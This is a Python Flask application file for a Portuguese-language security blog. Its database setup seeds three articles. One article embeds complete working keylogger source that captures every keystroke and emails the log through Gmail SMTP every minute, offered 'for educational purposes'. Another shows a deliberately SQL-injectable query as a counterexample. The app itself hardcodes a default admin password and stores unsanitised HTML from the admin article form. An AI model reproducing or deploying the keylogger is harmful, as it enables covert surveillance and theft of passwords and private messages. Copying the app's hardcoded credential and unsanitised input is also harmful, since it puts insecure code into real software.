from flask import Flask, render_template, request, redirect, url_for, flash, abort, session
from flask_login import LoginManager, login_user, logout_user, login_required, current_user
from werkzeug.security import generate_password_hash, check_password_hash
from flask_wtf import FlaskForm
from wtforms import StringField, TextAreaField, PasswordField
from wtforms.validators import DataRequired, Email
from models import db, User, Category, Article, Tag, Comment, ContactMessage
from config import Config
import re
import bleach
from datetime import datetime, timedelta
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config.from_object(Config)

# Segurança de sessão (ativa em produção com HTTPS)
if not app.debug:
    app.config.update(
        SESSION_COOKIE_SECURE=True,
        SESSION_COOKIE_HTTPONLY=True,
        SESSION_COOKIE_SAMESITE='Lax',
    )

db.init_app(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'admin_login'

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "style-src 'self' https://cdnjs.cloudflare.com https://fonts.googleapis.com; "
        "font-src 'self' https://cdnjs.cloudflare.com https://fonts.gstatic.com; "
        "script-src 'self' https://cdnjs.cloudflare.com; "
        "img-src 'self' https:; "
        "connect-src 'self'"
    )
    return response

# Formulários
class ContactForm(FlaskForm):
    name = StringField('Nome', validators=[DataRequired()])
    email = StringField('E-mail', validators=[DataRequired(), Email()])
    message = TextAreaField('Mensagem', validators=[DataRequired()])

class CommentForm(FlaskForm):
    author = StringField('Nome', validators=[DataRequired()])
    email = StringField('E-mail', validators=[DataRequired(), Email()])
    content = TextAreaField('Comentário', validators=[DataRequired()])

class AdminLoginForm(FlaskForm):
    username = StringField('Usuário', validators=[DataRequired()])
    password = PasswordField('Senha', validators=[DataRequired()])

# Inicialização segura
_tables_created = False

@app.before_request
def create_tables_once():
    global _tables_created
    if not _tables_created:
        with app.app_context():
            db.create_all()
            if not User.query.filter_by(username='admin').first():
                admin = User(username='admin', password=generate_password_hash('SuaSenhaForte123!'))
                db.session.add(admin)
            cat_names = ['Seguranca Cibernetica', 'Desenvolvimento Web', 'Programacao', 'Hacking Etico', 'Tecnologia']
            cat_map = {}
            for name in cat_names:
                cat = Category.query.filter_by(name=name).first()
                if not cat:
                    cat = Category(name=name)
                    db.session.add(cat)
                cat_map[name] = cat
            tag_names = ['python', 'segurança', 'web', 'tutorial', 'hacking', 'flask', 'sql', 'keylogger']
            tag_map = {}
            for tname in tag_names:
                tag = Tag.query.filter_by(name=tname).first()
                if not tag:
                    tag = Tag(name=tname)
                    db.session.add(tag)
                tag_map[tname] = tag
            if Article.query.count() == 0:
                now = datetime.utcnow()
                # Artigo 1
                art1 = Article(
                    title="Introdução ao Hacking Ético: Conceitos e Ferramentas",
                    slug="introducao-ao-hacking-etico",
                    content="""
                    <p>O <strong>hacking ético</strong> é a prática de testar sistemas, redes e aplicações para identificar vulnerabilidades — com permissão — e corrigi-las antes que invasores maliciosos as explorem.</p>
                    <h3>Por que é importante?</h3>
                    <p>Com o aumento de ataques cibernéticos, empresas precisam de profissionais que pensem como hackers, mas ajam como defensores.</p>
                    <h3>Ferramentas essenciais</h3>
                    <ul>
                        <li><strong>Nmap</strong>: para varredura de portas</li>
                        <li><strong>Burp Suite</strong>: análise de segurança web</li>
                        <li><strong>Metasploit</strong>: framework de exploração</li>
                        <li><strong>Wireshark</strong>: análise de tráfego de rede</li>
                    </ul>
                    <p><em>⚠️ Lembre-se: use essas ferramentas apenas em sistemas que você possui ou tem permissão explícita para testar.</em></p>
                    """,
                    category_id=cat_map['Hacking Etico'].id,
                    created_at=now - timedelta(days=5)
                )
                art1.tags = [tag_map['hacking'], tag_map['segurança'], tag_map['tutorial']]
                db.session.add(art1)
                # Artigo 2
                art2 = Article(
                    title="Criando um Keylogger em Python (para fins educacionais)",
                    slug="keylogger-em-python",
                    content="""
                    <p>Este tutorial mostra como criar um <strong>keylogger simples em Python</strong> — exclusivamente para <strong>fins educacionais</strong> e testes em seu próprio sistema.</p>
                    <h3>Código-fonte</h3>
                    <pre><code class="language-python">
import keyboard
import smtplib
from threading import Timer

LOG = ""
EMAIL = "seu@email.com"
SENHA = "sua_senha"
TEMPO = 60  # segundos

def callback(event):
    global LOG
    nome = event.name
    if len(nome) > 1:
        if nome == "space":
            nome = " "
        elif nome == "enter":
            nome = "\\n"
        else:
            nome = f"[{{nome}}]"
    LOG += nome

def enviar_email(email, senha, mensagem):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, senha)
    server.sendmail(email, email, mensagem)
    server.quit()

def relatorio():
    global LOG
    if LOG:
        enviar_email(EMAIL, SENHA, LOG)
    LOG = ""
    timer = Timer(TEMPO, relatorio)
    timer.daemon = True
    timer.start()

keyboard.on_release(callback=callback)
relatorio()
keyboard.wait()
                    </code></pre>
                    <p><em>⚠️ Este código é apenas para estudo. Usar keyloggers sem consentimento é crime.</em></p>
                    """,
                    category_id=cat_map['Programacao'].id,
                    created_at=now - timedelta(days=3)
                )
                art2.tags = [tag_map['python'], tag_map['tutorial'], tag_map['segurança'], tag_map['keylogger']]
                db.session.add(art2)
                # Artigo 3
                art3 = Article(
                    title="Protegendo seu site contra SQL Injection com Flask",
                    slug="protegendo-flask-contra-sql-injection",
                    content="""
                    <p><strong>SQL Injection</strong> é uma das vulnerabilidades mais críticas em aplicações web. Veja como evitá-la no Flask.</p>
                    <h3>❌ Código vulnerável</h3>
                    <pre><code class="language-python">
# NÃO FAÇA ISSO!
@app.route('/usuario')
def usuario():
    user_id = request.args.get('id')
    cur = db.connection.cursor()
    cur.execute("SELECT * FROM users WHERE id = " + user_id)  # PERIGOSO!
                    </code></pre>
                    <h3>✅ Código seguro com SQLAlchemy</h3>
                    <pre><code class="language-python">
# FAÇA ISSO!
@app.route('/usuario/<int:user_id>')
def usuario(user_id):
    user = User.query.get(user_id)
    return render_template('user.html', user=user)
                    </code></pre>
                    <p>Ou, se usar consultas brutas:</p>
                    <pre><code class="language-python">
db.session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
                    </code></pre>
                    <p><strong>Dica:</strong> sempre valide e sanitize entradas, e use parâmetros nomeados.</p>
                    """,
                    category_id=cat_map['Desenvolvimento Web'].id,
                    created_at=now - timedelta(days=1)
                )
                art3.tags = [tag_map['flask'], tag_map['web'], tag_map['segurança'], tag_map['python'], tag_map['sql']]
                db.session.add(art3)
            db.session.commit()
        _tables_created = True

# --- Rotas Públicas ---
@app.route('/')
def index():
    page = request.args.get('page', 1, type=int)
    articles = Article.query.order_by(Article.created_at.desc()).paginate(page=page, per_page=6, error_out=False)
    categories = Category.query.all()
    return render_template('index.html', articles=articles, categories=categories)

@app.route('/article/<slug>')
def article(slug):
    if not re.match(r'^[a-z0-9\-]+$', slug):
        abort(404)
    article_obj = Article.query.filter_by(slug=slug).first_or_404()
    form = CommentForm()
    return render_template('article.html', article=article_obj, form=form)

@app.route('/article/<slug>/comment', methods=['POST'])
def add_comment(slug):
    article = Article.query.filter_by(slug=slug).first_or_404()
    form = CommentForm()
    if form.validate_on_submit():
        clean_content = bleach.clean(
            form.content.data,
            tags=['p', 'br', 'strong', 'em', 'code'],
            strip=True
        )
        comment = Comment(
            author=form.author.data,
            email=form.email.data,
            content=clean_content,
            article_id=article.id
        )
        db.session.add(comment)
        db.session.commit()
    return redirect(url_for('article', slug=slug))

@app.route('/category/<int:cat_id>')
def category(cat_id):
    cat = Category.query.get_or_404(cat_id)
    articles = Article.query.filter_by(category_id=cat_id).all()
    categories = Category.query.all()
    return render_template('index.html', articles=articles, categories=categories, selected_category=cat.name)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    if query:
        articles = Article.query.filter(
            db.or_(
                Article.title.contains(query),
                Article.content.contains(query)
            )
        ).all()
    else:
        articles = []
    categories = Category.query.all()
    return render_template('index.html', articles=articles, categories=categories, search_query=query)

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    form = ContactForm()
    if form.validate_on_submit():
        msg = ContactMessage(
            name=form.name.data,
            email=form.email.data,
            message=form.message.data
        )
        db.session.add(msg)
        db.session.commit()
        flash('Mensagem enviada com sucesso!', 'success')
        return redirect(url_for('contact'))
    return render_template('contact.html', form=form)

@app.route('/admin/login', methods=['GET', 'POST'])

def admin_login():
    form = AdminLoginForm()
    if form.validate_on_submit():
        username = form.username.data
        password = form.password.data
        if len(password) < 8:
            flash('Senha deve ter no mínimo 8 caracteres.', 'error')
            return render_template('admin/login.html', form=form)
        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            login_user(user)
            session.permanent = True
            app.permanent_session_lifetime = 1800  # 30 minutos
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Usuário ou senha inválidos.', 'error')
    return render_template('admin/login.html', form=form)

@app.route('/admin/logout')
@login_required
def admin_logout():
    logout_user()
    return redirect(url_for('index'))

@app.route('/admin')
@login_required
def admin_dashboard():
    return render_template('admin/dashboard.html')

@app.route('/admin/article/new', methods=['GET', 'POST'])
@login_required
def admin_create_article():
    categories = Category.query.all()
    tags = Tag.query.all()
    if request.method == 'POST':
        title = request.form['title']
        slug = re.sub(r'[^a-z0-9]+', '-', title.lower().strip())
        slug = re.sub(r'^-+|-+$', '', slug) or "artigo-sem-titulo"
        content = request.form['content']
        cat_id = request.form['category']
        tag_ids = request.form.getlist('tags')
        article = Article(title=title, slug=slug, content=content, category_id=cat_id)
        for tag_id in tag_ids:
            tag = Tag.query.get(tag_id)
            if tag:
                article.tags.append(tag)
        db.session.add(article)
        db.session.commit()
        flash('Artigo criado com sucesso!', 'success')
        return redirect(url_for('admin_dashboard'))
    return render_template('admin/create_article.html', categories=categories, tags=tags)

@app.route('/admin/category/manage', methods=['GET', 'POST'])
@login_required
def admin_manage_categories():
    if request.method == 'POST':
        name = request.form['name']
        if name:
            cat = Category(name=name)
            db.session.add(cat)
            db.session.commit()
            flash('Categoria adicionada!', 'success')
    categories = Category.query.all()
    return render_template('admin/manage_categories.html', categories=categories)

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5000)